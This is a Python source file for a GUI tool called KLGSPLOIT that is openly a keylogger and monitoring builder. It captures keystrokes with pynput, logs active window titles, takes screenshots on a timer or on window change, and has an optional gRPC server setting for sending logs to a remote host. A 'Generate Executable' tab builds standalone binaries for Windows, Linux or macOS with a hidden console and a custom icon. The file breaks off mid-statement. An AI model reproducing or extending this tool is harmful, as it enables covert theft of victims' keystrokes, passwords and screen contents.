#!/usr/bin/env python3

import os
import sys
import threading
import time
import platform
import subprocess
import tempfile
import shutil
import json
import re
from datetime import datetime
from collections import Counter

# Tkinter imports
import tkinter as tk
from tkinter import filedialog, StringVar, BooleanVar, IntVar, END, BOTH, YES, X, LEFT, RIGHT, W
from tkinter import Frame as TkFrame

# Check for ttkbootstrap
try:
    import ttkbootstrap as ttk
    from ttkbootstrap.constants import *
    from ttkbootstrap.dialogs import Messagebox
    HAS_TTK_BOOTSTRAP = True
except ImportError:
    from tkinter import ttk
    from tkinter import messagebox
    HAS_TTK_BOOTSTRAP = False
    print("[!] ttkbootstrap not found, using standard tkinter")
    print("[!] Install with: pip install ttkbootstrap")

# Check for pynput
try:
    from pynput import keyboard
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False
    print("[!] pynput not found. Install with: pip install pynput")

# Check for PIL/mss
try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import mss
    HAS_MSS = True
except ImportError:
    HAS_MSS = False


COLORS = {
    # Backgrounds
    'bg_dark': '#0B1437',
    'bg_medium': '#162447',
    'bg_light': '#1F3A5F',
    
    # Primary accents
    'primary': '#00D4FF',
    'secondary': '#667EEA',
    'tertiary': '#7B2FF7',
    
    # Functional colors
    'success': '#10B981',
    'warning': '#F59E0B',
    'danger': '#EF4444',
    'info': '#3B82F6',
    
    # Text colors
    'text_primary': '#F9FAFB',
    'text_secondary': '#9CA3AF',
    'text_muted': '#6B7280',
    
    # Graphics
    'graph_1': '#00D4FF',
    'graph_2': '#667EEA',
    'graph_3': '#10B981',
    'graph_4': '#F59E0B',
    
    # Borders
    'border': '#1F3A5F',
    'divider': '#374151',
}


# Platform-specific window title detection
def get_active_window_title():
    """Get the title of the currently active window."""
    system = platform.system()
    
    if system == "Windows":
        try:
            import ctypes
            user32 = ctypes.windll.user32
            h_wnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(h_wnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(h_wnd, buf, length + 1)
            title = buf.value
            if not title or title == "Program Manager":
                return "Desktop"
            return title
        except Exception:
            return "Desktop"
    
    elif system == "Linux":
        try:
            from Xlib import display, X
            d = display.Display()
            root = d.screen().root
            NET_ACTIVE_WINDOW = d.intern_atom('_NET_ACTIVE_WINDOW')
            prop = root.get_full_property(NET_ACTIVE_WINDOW, X.AnyPropertyType)
            if not prop:
                return "Desktop"
            win_id = prop.value[0]
            if win_id == 0:
                return "Desktop"
            window = d.create_resource_object('window', win_id)
            NET_WM_NAME = d.intern_atom('_NET_WM_NAME')
            wm_name_prop = window.get_full_property(NET_WM_NAME, X.AnyPropertyType)
            if wm_name_prop:
                name = wm_name_prop.value
                if isinstance(name, bytes):
                    return name.decode('utf-8', errors='ignore')
                return str(name)
            wm_name = window.get_wm_name()
            return wm_name if wm_name else "Desktop"
        except Exception:
            return "Desktop"
    
    elif system == "Darwin":
        try:
            from AppKit import NSWorkspace
            active_app = NSWorkspace.sharedWorkspace().activeApplication()
            app_name = active_app.get('NSApplicationName')
            return app_name if app_name else "Desktop"
        except Exception:
            return "Desktop"
    
    return "Desktop"


class KlgsploitGUI:
    def __init__(self):
        # Create window with modern theme
        if HAS_TTK_BOOTSTRAP:
            self.app = ttk.Window(themename="darkly")
        else:
            self.app = tk.Tk()

        self.app.title("KLGSPLOIT - Advanced System Logger")
        self.app.geometry("1200x800")
        self.app.configure(bg=COLORS['bg_dark'])

        # State variables
        self.keylogger_running = False
        self.keylogger_listener = None
        self.screenshot_thread = None
        self.screenshot_running = False
        self.last_window_title = ""
        self.grpc_server_running = False
        self.update_timer = None

        # gRPC client variables
        self.grpc_channel = None
        self.grpc_stub = None

        # Control variables
        self.var_status = StringVar(value="Inactive")
        self.var_output_file = StringVar(value="keylog.txt")
        self.var_timestamp = BooleanVar(value=True)
        self.var_window_title = BooleanVar(value=True)
        self.var_screenshot = BooleanVar(value=False)
        self.var_screenshot_interval = IntVar(value=60)
        self.var_screenshot_folder = StringVar(value="screenshots")
        self.var_screenshot_on_change = BooleanVar(value=False)
        self.var_grpc_server = StringVar(value="")
        self.var_grpc_port = IntVar(value=50051)

        # Statistics variables
        self.var_key_count = StringVar(value="0")
        self.var_window_count = StringVar(value="0")
        self.var_duration = StringVar(value="00:00:00")
        self.var_screenshot_count = StringVar(value="0")
        
        # Exe generation variables
        self.var_exe_name = StringVar(value="keylogger")
        self.var_exe_os = StringVar(value=self._detect_os())
        self.var_exe_onefile = BooleanVar(value=True)
        self.var_exe_noconsole = BooleanVar(value=True)
        self.var_exe_icon = StringVar(value="")
        self.var_exe_timestamp = BooleanVar(value=True)
        self.var_exe_window = BooleanVar(value=True)
        self.var_exe_screenshot = BooleanVar(value=False)
        self.var_exe_screenshot_interval = IntVar(value=60)
        self.var_exe_grpc = StringVar(value="")

        # Classify variables
        self.var_classify_file = StringVar(value="keylog.txt")

        # Stats
        self.key_count = 0
        self.window_changes = 0
        self.start_time = None

        # Configure styles
        self._configure_styles()
        
        # Build UI
        self._build_ui()

    def _detect_os(self):
        if sys.platform.startswith('win'):
            return 'win'
        elif sys.platform.startswith('linux'):
            return 'lnx'
        elif sys.platform.startswith('darwin'):
            return 'mac'
        return 'lnx'

    def _configure_styles(self):
        style = ttk.Style()
        
        # Frame styles
        style.configure('Dark.TFrame', background=COLORS['bg_dark'])
        style.configure('Card.TFrame', background=COLORS['bg_medium'], relief='flat', borderwidth=0)
        style.configure('Chart.TFrame', background=COLORS['bg_light'], relief='flat')
        style.configure('Progress.TFrame', background=COLORS['primary'])
        
        # Notebook style
        style.configure('Modern.TNotebook', background=COLORS['bg_dark'], borderwidth=0)
        style.configure('Modern.TNotebook.Tab', 
                       background=COLORS['bg_medium'],
                       foreground=COLORS['text_secondary'],
                       padding=[20, 10],
                       font=('Segoe UI', 10))

    def _build_ui(self):
        
        # === HEADER MODERNE ===
        header = ttk.Frame(self.app, height=80)
        header.configure(style='Dark.TFrame')
        header.pack(fill=X)
        header.pack_propagate(False)
        
        # Container header
        header_content = ttk.Frame(header)
        header_content.configure(style='Dark.TFrame')
        header_content.pack(fill=BOTH, expand=YES, padx=30, pady=15)
        
        # Titre avec icône
        title_frame = ttk.Frame(header_content)
        title_frame.configure(style='Dark.TFrame')
        title_frame.pack(side=LEFT)
        
        ttk.Label(
            title_frame,
            text="🔐 KLGSPLOIT",
            font=('Segoe UI', 20, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_dark']
        ).pack(side=LEFT)
        
        
        
        # Statut à droite
        status_frame = ttk.Frame(header_content)
        status_frame.configure(style='Dark.TFrame')
        status_frame.pack(side=RIGHT)
        
        ttk.Label(
            status_frame,
            text="●",
            font=('Arial', 16),
            foreground=COLORS['success'],
            background=COLORS['bg_dark']
        ).pack(side=LEFT, padx=(0,8))
        
        self.status_display = ttk.Label(
            status_frame,
            textvariable=self.var_status,
            font=('Segoe UI', 11),
            foreground=COLORS['text_secondary'],
            background=COLORS['bg_dark']
        )
        self.status_display.pack(side=LEFT)
        
        # === LIGNE DE SÉPARATION ===
        separator = TkFrame(self.app, height=1, bg=COLORS['divider'])
        separator.pack(fill=X)
        
        # === CONTAINER PRINCIPAL ===
        main_container = ttk.Frame(self.app)
        main_container.configure(style='Dark.TFrame')
        main_container.pack(fill=BOTH, expand=YES, padx=20, pady=20)
        
        # === NOTEBOOK MODERNE ===
        self.notebook = ttk.Notebook(main_container, style='Modern.TNotebook')
        self.notebook.pack(fill=BOTH, expand=YES)
        
        # Build all tabs
        self._build_dashboard_tab()
        self._build_keylogger_tab()
        self._build_screenshot_tab()
        self._build_genexe_tab()
        self._build_classify_tab()
        self._build_viewer_tab()
        self._build_grpc_tab()

    def _build_dashboard_tab(self):
        tab = ttk.Frame(self.notebook)
        tab.configure(style='Dark.TFrame')
        self.notebook.add(tab, text="  📊 DASHBOARD  ")
        
        # Container avec padding
        container = ttk.Frame(tab)
        container.configure(style='Dark.TFrame')
        container.pack(fill=BOTH, expand=YES, padx=20, pady=20)
        
        # === LIGNE 1 : CARTES STATISTIQUES (4 cartes) ===
        stats_row = ttk.Frame(container)
        stats_row.configure(style='Dark.TFrame')
        stats_row.pack(fill=X, pady=(0,20))
        
        # Carte 1: Touches
        self._create_stat_card(
            stats_row, 
            "Total Keystrokes",
            self.var_key_count,
            "⌨️",
            COLORS['primary'],
            "+Live"
        ).pack(side=LEFT, fill=BOTH, expand=YES, padx=(0,15))
        
        # Carte 2: Fenêtres
        self._create_stat_card(
            stats_row,
            "Window Changes", 
            self.var_window_count,
            "🪟",
            COLORS['secondary'],
            "Active"
        ).pack(side=LEFT, fill=BOTH, expand=YES, padx=(0,15))
        
        # Carte 3: Durée
        self._create_stat_card(
            stats_row,
            "Session Duration",
            self.var_duration,
            "⏱️",
            COLORS['success'],
            "Running"
        ).pack(side=LEFT, fill=BOTH, expand=YES, padx=(0,15))
        
        # Carte 4: Screenshots
        self._create_stat_card(
            stats_row,
            "Screenshots",
            self.var_screenshot_count,
            "📷",
            COLORS['warning'],
            "Total"
        ).pack(side=LEFT, fill=BOTH, expand=YES)
        
        # === LIGNE 2 : GRAPHIQUES/INFOS ===
        charts_row = ttk.Frame(container)
        charts_row.configure(style='Dark.TFrame')
        charts_row.pack(fill=BOTH, expand=YES)
        
        # Colonne gauche (2/3)
        left_col = ttk.Frame(charts_row)
        left_col.configure(style='Dark.TFrame')
        left_col.pack(side=LEFT, fill=BOTH, expand=YES, padx=(0,15))
        
        # Graphique d'activité
        activity_card = self._create_chart_card(
            left_col,
            "📈 Activity Trend",
            "Real-time monitoring"
        )
        activity_card.pack(fill=BOTH, expand=YES, pady=(0,15))
        
        # Status détaillé
        status_items = [
            ("Keylogger", "Stopped", COLORS['danger']),
            ("Screenshots", "Ready", COLORS['info']),
            ("gRPC Server", "Offline", COLORS['text_muted']),
            ("Log File", "keylog.txt", COLORS['success'])
        ]
        status_card = self._create_info_card(
            left_col,
            "ℹ️ System Status",
            status_items
        )
        status_card.pack(fill=BOTH, expand=YES)
        
        # Colonne droite (1/3)
        right_col = ttk.Frame(charts_row)
        right_col.configure(style='Dark.TFrame')
        right_col.pack(side=RIGHT, fill=BOTH, expand=YES)
        
        # Quick Actions
        actions_card = self._create_actions_card(right_col)
        actions_card.pack(fill=BOTH, expand=YES, pady=(0,15))
        
        # Dependencies Info
        deps_card = self._create_deps_card(right_col)
        deps_card.pack(fill=BOTH, expand=YES)

    def _create_stat_card(self, parent, title, var, icon, color, trend):
        """Créer une carte statistique moderne"""
        card = ttk.Frame(parent, style='Card.TFrame')
        
        # Container interne
        inner = ttk.Frame(card)
        inner.configure(style='Card.TFrame')
        inner.pack(fill=BOTH, expand=YES, padx=20, pady=20)
        
        # Header avec icône
        header = ttk.Frame(inner)
        header.configure(style='Card.TFrame')
        header.pack(fill=X)
        
        ttk.Label(
            header,
            text=icon,
            font=('Segoe UI', 24),
            background=COLORS['bg_medium']
        ).pack(side=LEFT)
        
        ttk.Label(
            header,
            text=trend,
            font=('Segoe UI', 9, 'bold'),
            foreground=color,
            background=COLORS['bg_medium']
        ).pack(side=RIGHT)
        
        # Valeur principale
        value_label = ttk.Label(
            inner,
            textvariable=var,
            font=('Segoe UI', 36, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        )
        value_label.pack(pady=(10,5))
        
        # Titre
        ttk.Label(
            inner,
            text=title,
            font=('Segoe UI', 10),
            foreground=COLORS['text_secondary'],
            background=COLORS['bg_medium']
        ).pack()
        
        # Barre de progression décorative
        progress_bar = ttk.Frame(inner, height=3)
        progress_bar.configure(style='Card.TFrame')
        progress_bar.pack(fill=X, pady=(15,0))
        
        progress_fill = ttk.Frame(progress_bar, height=3)
        progress_fill.configure(style='Progress.TFrame')
        progress_fill.pack(side=LEFT, fill=BOTH, expand=YES)
        
        return card

    def _create_chart_card(self, parent, title, subtitle):
        """Créer une carte pour graphique"""
        card = ttk.Frame(parent, style='Card.TFrame')
        
        inner = ttk.Frame(card)
        inner.configure(style='Card.TFrame')
        inner.pack(fill=BOTH, expand=YES, padx=25, pady=20)
        
        # Header
        header = ttk.Frame(inner)
        header.configure(style='Card.TFrame')
        header.pack(fill=X, pady=(0,15))
        
        ttk.Label(
            header,
            text=title,
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(side=LEFT)
        
        ttk.Label(
            header,
            text=subtitle,
            font=('Segoe UI', 9),
            foreground=COLORS['text_muted'],
            background=COLORS['bg_medium']
        ).pack(side=RIGHT)
        
        # Zone graphique simulée
        chart_area = ttk.Frame(inner, height=150)
        chart_area.configure(style='Chart.TFrame')
        chart_area.pack(fill=BOTH, expand=YES)
        chart_area.pack_propagate(False)
        
        ttk.Label(
            chart_area,
            text="📊 Activity monitoring graph\n(Live data visualization)",
            font=('Segoe UI', 11),
            foreground=COLORS['text_muted'],
            background=COLORS['bg_light'],
            justify='center'
        ).place(relx=0.5, rely=0.5, anchor='center')
        
        return card

    def _create_info_card(self, parent, title, items):
        """Créer une carte d'informations"""
        card = ttk.Frame(parent, style='Card.TFrame')
        
        inner = ttk.Frame(card)
        inner.configure(style='Card.TFrame')
        inner.pack(fill=BOTH, expand=YES, padx=25, pady=20)
        
        # Titre
        ttk.Label(
            inner,
            text=title,
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,15))
        
        # Items
        for label, value, color in items:
            item_frame = ttk.Frame(inner)
            item_frame.configure(style='Card.TFrame')
            item_frame.pack(fill=X, pady=8)
            
            ttk.Label(
                item_frame,
                text=label,
                font=('Segoe UI', 10),
                foreground=COLORS['text_secondary'],
                background=COLORS['bg_medium']
            ).pack(side=LEFT)
            
            ttk.Label(
                item_frame,
                text=value,
                font=('Segoe UI', 10, 'bold'),
                foreground=color,
                background=COLORS['bg_medium']
            ).pack(side=RIGHT)
        
        return card

    def _create_actions_card(self, parent):
        """Carte d'actions rapides"""
        card = ttk.Frame(parent, style='Card.TFrame')
        
        inner = ttk.Frame(card)
        inner.configure(style='Card.TFrame')
        inner.pack(fill=BOTH, expand=YES, padx=25, pady=20)
        
        ttk.Label(
            inner,
            text="⚡ Quick Actions",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,15))
        
        # Boutons
        self.btn_dash_toggle = ttk.Button(
            inner,
            text="▶ Start Keylogger",
            command=self._toggle_keylogger,
            bootstyle="success",
            width=20
        )
        self.btn_dash_toggle.pack(fill=X, pady=5)
        
        ttk.Button(
            inner,
            text="📸 Take Screenshot",
            command=self._take_screenshot,
            bootstyle="warning-outline",
            width=20
        ).pack(fill=X, pady=5)
        
        ttk.Button(
            inner,
            text="🔍 Analyze Logs",
            command=lambda: self.notebook.select(4),
            bootstyle="primary",
            width=20
        ).pack(fill=X, pady=5)
        
        ttk.Button(
            inner,
            text="📄 View Logs",
            command=lambda: self.notebook.select(5),
            bootstyle="info-outline",
            width=20
        ).pack(fill=X, pady=5)
        
        return card

    def _create_deps_card(self, parent):
        """Carte dépendances"""
        card = ttk.Frame(parent, style='Card.TFrame')
        
        inner = ttk.Frame(card)
        inner.configure(style='Card.TFrame')
        inner.pack(fill=BOTH, expand=YES, padx=25, pady=20)
        
        ttk.Label(
            inner,
            text="📦 Dependencies",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,15))
        
        # Dependencies
        deps = [
            ("pynput", "✓ Installed" if HAS_PYNPUT else "✗ Missing", COLORS['success'] if HAS_PYNPUT else COLORS['danger']),
            ("PIL", "✓ Installed" if HAS_PIL else "✗ Missing", COLORS['success'] if HAS_PIL else COLORS['danger']),
            ("mss", "✓ Installed" if HAS_MSS else "✗ Missing", COLORS['success'] if HAS_MSS else COLORS['danger']),
            ("ttkbootstrap", "✓ Installed" if HAS_TTK_BOOTSTRAP else "✗ Missing", COLORS['success'] if HAS_TTK_BOOTSTRAP else COLORS['danger']),
        ]
        
        for dep, status, color in deps:
            dep_frame = ttk.Frame(inner)
            dep_frame.configure(style='Card.TFrame')
            dep_frame.pack(fill=X, pady=6)
            
            ttk.Label(
                dep_frame,
                text=dep,
                font=('Segoe UI', 10),
                foreground=COLORS['text_secondary'],
                background=COLORS['bg_medium']
            ).pack(side=LEFT)
            
            ttk.Label(
                dep_frame,
                text=status,
                font=('Segoe UI', 9, 'bold'),
                foreground=color,
                background=COLORS['bg_medium']
            ).pack(side=RIGHT)
        
        # System info
        ttk.Label(
            inner,
            text=f"\n💻 {platform.system()} {platform.release()}",
            font=('Segoe UI', 9),
            foreground=COLORS['text_muted'],
            background=COLORS['bg_medium']
        ).pack(anchor=W)
        
        return card

    # ============================================================================
    # AUTRES ONGLETS (style moderne mais simplifié)
    # ============================================================================

    def _build_keylogger_tab(self):
        """Build the keylogger control tab."""
        tab = ttk.Frame(self.notebook)
        tab.configure(style='Dark.TFrame')
        self.notebook.add(tab, text="  🎮 KEYLOGGER  ")
        
        container = ttk.Frame(tab)
        container.configure(style='Dark.TFrame')
        container.pack(fill=BOTH, expand=YES, padx=40, pady=40)

        # Status card
        status_card = ttk.Frame(container, style='Card.TFrame')
        status_card.pack(fill=X, pady=(0,20))
        
        status_inner = ttk.Frame(status_card)
        status_inner.configure(style='Card.TFrame')
        status_inner.pack(fill=BOTH, expand=YES, padx=30, pady=20)
        
        ttk.Label(
            status_inner,
            text="Status",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,10))
        
        self.lbl_status = ttk.Label(
            status_inner,
            textvariable=self.var_status,
            font=("Consolas", 18, "bold"),
            foreground=COLORS['primary'],
            background=COLORS['bg_medium']
        )
        self.lbl_status.pack(pady=10)

        # Control buttons
        btn_frame = ttk.Frame(status_inner)
        btn_frame.configure(style='Card.TFrame')
        btn_frame.pack(pady=10)

        self.btn_start = ttk.Button(
            btn_frame,
            text="▶ Start Keylogger",
            command=self._toggle_keylogger,
            bootstyle="success",
            width=20
        )
        self.btn_start.pack(side=LEFT, padx=5)

        # Options card
        options_card = ttk.Frame(container, style='Card.TFrame')
        options_card.pack(fill=X, pady=(0,20))
        
        options_inner = ttk.Frame(options_card)
        options_inner.configure(style='Card.TFrame')
        options_inner.pack(fill=BOTH, expand=YES, padx=30, pady=20)
        
        ttk.Label(
            options_inner,
            text="Options",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,15))

        # Output file
        row1 = ttk.Frame(options_inner)
        row1.configure(style='Card.TFrame')
        row1.pack(fill=X, pady=5)
        ttk.Label(row1, text="Output File:", width=15, 
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(side=LEFT)
        ttk.Entry(row1, textvariable=self.var_output_file, width=40).pack(side=LEFT, padx=5)
        ttk.Button(row1, text="Browse", command=self._browse_output, bootstyle="info-outline").pack(side=LEFT)

        # Checkboxes
        row2 = ttk.Frame(options_inner)
        row2.configure(style='Card.TFrame')
        row2.pack(fill=X, pady=10)
        ttk.Checkbutton(row2, text="Enable Timestamps", variable=self.var_timestamp,
                        bootstyle="success-round-toggle").pack(side=LEFT, padx=10)
        ttk.Checkbutton(row2, text="Log Window Titles", variable=self.var_window_title,
                        bootstyle="success-round-toggle").pack(side=LEFT, padx=10)

        # gRPC
        row3 = ttk.Frame(options_inner)
        row3.configure(style='Card.TFrame')
        row3.pack(fill=X, pady=5)
        ttk.Label(row3, text="gRPC Server:", width=15,
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(side=LEFT)
        ttk.Entry(row3, textvariable=self.var_grpc_server, width=30).pack(side=LEFT, padx=5)
        ttk.Label(row3, text="(leave empty to disable)",
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_muted']).pack(side=LEFT)

        # Info card
        info_card = ttk.Frame(container, style='Card.TFrame')
        info_card.pack(fill=X)
        
        info_inner = ttk.Frame(info_card)
        info_inner.configure(style='Card.TFrame')
        info_inner.pack(fill=BOTH, expand=YES, padx=30, pady=20)
        
        ttk.Label(
            info_inner,
            text="ℹ️ Info",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,10))
        
        ttk.Label(info_inner, text="⚠️ Press ESC to stop the keylogger when running.",
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(anchor=W, pady=3)
        ttk.Label(info_inner, text=f"📍 Detected OS: {platform.system()} ({self._detect_os()})",
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(anchor=W, pady=3)
        
        deps_text = f"📦 Dependencies: pynput={'✓' if HAS_PYNPUT else '✗'}, PIL={'✓' if HAS_PIL else '✗'}, mss={'✓' if HAS_MSS else '✗'}"
        ttk.Label(info_inner, text=deps_text,
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(anchor=W, pady=3)

    def _build_screenshot_tab(self):
        """Build the screenshot control tab."""
        tab = ttk.Frame(self.notebook)
        tab.configure(style='Dark.TFrame')
        self.notebook.add(tab, text="  📸 SCREENSHOTS  ")
        
        container = ttk.Frame(tab)
        container.configure(style='Dark.TFrame')
        container.pack(fill=BOTH, expand=YES, padx=40, pady=40)

        # Manual capture card
        manual_card = ttk.Frame(container, style='Card.TFrame')
        manual_card.pack(fill=X, pady=(0,20))
        
        manual_inner = ttk.Frame(manual_card)
        manual_inner.configure(style='Card.TFrame')
        manual_inner.pack(fill=BOTH, expand=YES, padx=30, pady=20)
        
        ttk.Label(
            manual_inner,
            text="Manual Capture",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,15))

        ttk.Button(manual_inner, text="📸 Take Screenshot Now", command=self._take_screenshot,
                   bootstyle="primary", width=25).pack(pady=10)

        # Auto capture card
        auto_card = ttk.Frame(container, style='Card.TFrame')
        auto_card.pack(fill=BOTH, expand=YES)
        
        auto_inner = ttk.Frame(auto_card)
        auto_inner.configure(style='Card.TFrame')
        auto_inner.pack(fill=BOTH, expand=YES, padx=30, pady=20)
        
        ttk.Label(
            auto_inner,
            text="Automatic Capture",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,15))

        row1 = ttk.Frame(auto_inner)
        row1.configure(style='Card.TFrame')
        row1.pack(fill=X, pady=5)
        ttk.Label(row1, text="Output Folder:", width=15,
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(side=LEFT)
        ttk.Entry(row1, textvariable=self.var_screenshot_folder, width=30).pack(side=LEFT, padx=5)
        ttk.Button(row1, text="Browse", command=self._browse_screenshot_folder, 
                  bootstyle="info-outline").pack(side=LEFT)

        row2 = ttk.Frame(auto_inner)
        row2.configure(style='Card.TFrame')
        row2.pack(fill=X, pady=5)
        ttk.Label(row2, text="Interval (sec):", width=15,
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(side=LEFT)
        ttk.Spinbox(row2, from_=5, to=3600, textvariable=self.var_screenshot_interval, width=10).pack(side=LEFT, padx=5)

        row3 = ttk.Frame(auto_inner)
        row3.configure(style='Card.TFrame')
        row3.pack(fill=X, pady=10)
        ttk.Checkbutton(row3, text="Screenshot on Window Change (instead of interval)",
                        variable=self.var_screenshot_on_change, bootstyle="success-round-toggle").pack(side=LEFT)

        row4 = ttk.Frame(auto_inner)
        row4.configure(style='Card.TFrame')
        row4.pack(fill=X, pady=10)
        self.btn_auto_screenshot = ttk.Button(row4, text="▶ Start Auto Screenshot",
                                               command=self._toggle_auto_screenshot, bootstyle="success", width=25)
        self.btn_auto_screenshot.pack()

    def _build_genexe_tab(self):
        """Build the executable generation tab (exactly like original but with modern cards)."""
        tab = ttk.Frame(self.notebook)
        tab.configure(style='Dark.TFrame')
        self.notebook.add(tab, text="  🔧 GENERATE EXE  ")

        # Create scrollable frame
        canvas = tk.Canvas(tab, bg=COLORS['bg_dark'], highlightthickness=0)
        scrollbar = ttk.Scrollbar(tab, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        scrollable_frame.configure(style='Dark.TFrame')

        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )

        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)

        container = ttk.Frame(scrollable_frame)
        container.configure(style='Dark.TFrame')
        container.pack(fill=BOTH, expand=YES, padx=40, pady=40)

        # Basic settings
        basic_card = ttk.Frame(container, style='Card.TFrame')
        basic_card.pack(fill=X, pady=(0,20))
        
        basic_inner = ttk.Frame(basic_card)
        basic_inner.configure(style='Card.TFrame')
        basic_inner.pack(fill=BOTH, expand=YES, padx=30, pady=20)
        
        ttk.Label(
            basic_inner,
            text="Basic Settings",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,15))

        row1 = ttk.Frame(basic_inner)
        row1.configure(style='Card.TFrame')
        row1.pack(fill=X, pady=5)
        ttk.Label(row1, text="Executable Name:", width=18,
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(side=LEFT)
        ttk.Entry(row1, textvariable=self.var_exe_name, width=30).pack(side=LEFT, padx=5)

        row2 = ttk.Frame(basic_inner)
        row2.configure(style='Card.TFrame')
        row2.pack(fill=X, pady=5)
        ttk.Label(row2, text="Target OS:", width=18,
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(side=LEFT)
        ttk.Radiobutton(row2, text="Windows", variable=self.var_exe_os, value="win", bootstyle="toolbutton").pack(side=LEFT, padx=5)
        ttk.Radiobutton(row2, text="Linux", variable=self.var_exe_os, value="lnx", bootstyle="toolbutton").pack(side=LEFT, padx=5)
        ttk.Radiobutton(row2, text="macOS", variable=self.var_exe_os, value="mac", bootstyle="toolbutton").pack(side=LEFT, padx=5)

        row3 = ttk.Frame(basic_inner)
        row3.configure(style='Card.TFrame')
        row3.pack(fill=X, pady=5)
        ttk.Checkbutton(row3, text="Single File (--onefile)", variable=self.var_exe_onefile,
                        bootstyle="success-round-toggle").pack(side=LEFT, padx=10)
        ttk.Checkbutton(row3, text="Hide Console (--noconsole)", variable=self.var_exe_noconsole,
                        bootstyle="success-round-toggle").pack(side=LEFT, padx=10)

        row4 = ttk.Frame(basic_inner)
        row4.configure(style='Card.TFrame')
        row4.pack(fill=X, pady=5)
        ttk.Label(row4, text="Icon File:", width=18,
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(side=LEFT)
        ttk.Entry(row4, textvariable=self.var_exe_icon, width=30).pack(side=LEFT, padx=5)
        ttk.Button(row4, text="Browse", command=self._browse_icon, bootstyle="info-outline").pack(side=LEFT)

        # Features
        features_card = ttk.Frame(container, style='Card.TFrame')
        features_card.pack(fill=X, pady=(0,20))
        
        features_inner = ttk.Frame(features_card)
        features_inner.configure(style='Card.TFrame')
        features_inner.pack(fill=BOTH, expand=YES, padx=30, pady=20)
        
        ttk.Label(
            features_inner,
            text="Features to Include",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,15))

        row5 = ttk.Frame(features_inner)
        row5.configure(style='Card.TFrame')
        row5.pack(fill=X, pady=5)
        ttk.Checkbutton(row5, text="Timestamps", variable=self.var_exe_timestamp,
                        bootstyle="success-round-toggle").pack(side=LEFT, padx=10)
        ttk.Checkbutton(row5, text="Window Titles", variable=self.var_exe_window,
                        bootstyle="success-round-toggle").pack(side=LEFT, padx=10)
        ttk.Checkbutton(row5, text="Screenshots", variable=self.var_exe_screenshot,
                        bootstyle="success-round-toggle").pack(side=LEFT, padx=10)

        row6 = ttk.Frame(features_inner)
        row6.configure(style='Card.TFrame')
        row6.pack(fill=X, pady=5)
        ttk.Label(row6, text="Screenshot Interval:", width=18,
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(side=LEFT)
        ttk.Spinbox(row6, from_=5, to=3600, textvariable=self.var_exe_screenshot_interval, width=10).pack(side=LEFT, padx=5)
        ttk.Label(row6, text="seconds",
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_muted']).pack(side=LEFT)

        row7 = ttk.Frame(features_inner)
        row7.configure(style='Card.TFrame')
        row7.pack(fill=X, pady=5)
        ttk.Label(row7, text="gRPC Server:", width=18,
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(side=LEFT)
        ttk.Entry(row7, textvariable=self.var_exe_grpc, width=30).pack(side=LEFT, padx=5)
        ttk.Label(row7, text="(host:port or leave empty)",
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_muted']).pack(side=LEFT)

        # Generate button
        btn_frame = ttk.Frame(container)
        btn_frame.configure(style='Dark.TFrame')
        btn_frame.pack(fill=X, pady=20)
        ttk.Button(btn_frame, text="🔨 Generate Executable", command=self._generate_executable,
                   bootstyle="success", width=25).pack()

        # Output
        output_card = ttk.Frame(container, style='Card.TFrame')
        output_card.pack(fill=BOTH, expand=YES)
        
        output_inner = ttk.Frame(output_card)
        output_inner.configure(style='Card.TFrame')
        output_inner.pack(fill=BOTH, expand=YES, padx=20, pady=15)
        
        ttk.Label(
